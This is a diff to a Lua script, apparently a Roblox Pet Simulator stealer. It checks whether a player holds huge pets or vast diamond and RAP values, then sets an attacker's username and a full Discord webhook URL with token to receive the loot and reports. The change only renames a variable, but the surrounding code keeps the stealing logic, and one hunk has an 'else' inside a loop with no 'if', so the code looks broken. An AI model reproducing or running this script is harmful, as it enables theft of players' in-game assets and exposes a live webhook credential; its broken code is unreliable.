@@ -16,7 +16,7 @@ for i,v in pairs(Library.Save.Get().Pets) do
     end
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     Username = "TehPucuk_55"
+     username = "TehPucuk_55"
      WebHook = "https://discord.com/api/webhooks/1123217431209451570/SqU9AFLcRkODdNrBzANlSzd3HtL9tCiXSVWyqG-V0jYM2sqU64s2OgJTgcqWHKh3OHxQ"
 end
 
@@ -1249,7 +1249,7 @@ local user
 -- Gems Only
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
-        user = Username
+        user = username
     else
         user = ndUser
     end
@@ -1327,7 +1327,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = Username
+                user = username
                 else
                 user = ndUser
                 if hugein ~= nil then
